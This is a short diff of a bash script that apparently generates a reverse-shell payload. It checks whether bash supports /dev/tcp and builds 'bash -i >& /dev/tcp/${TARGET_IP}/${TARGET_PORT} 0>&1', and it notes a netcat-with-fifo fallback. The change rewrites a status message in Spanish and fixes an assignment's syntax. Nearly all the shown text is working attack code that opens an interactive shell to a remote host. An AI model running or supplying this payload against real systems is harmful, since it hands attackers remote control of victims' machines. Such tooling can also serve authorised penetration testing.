@@ -41,8 +41,8 @@ bash_supports_dev_tcp() {
 #creating payload based in the machine situation
 PAYLOAD = ""
 if bash_supports_dev_tcp; then
-	echo "[*] Bash seems to support /dev/tcp (using native payload)"
-	PAYLOAD = "bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1"
+  echo "[*] Bash parece soportar /dev/tcp -> usar payload bash native."
+  PAYLOAD="bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1"
 else 
 	if command -v nc >/dev/null 2>&1; then
 		#netcat is available at least so use fifo
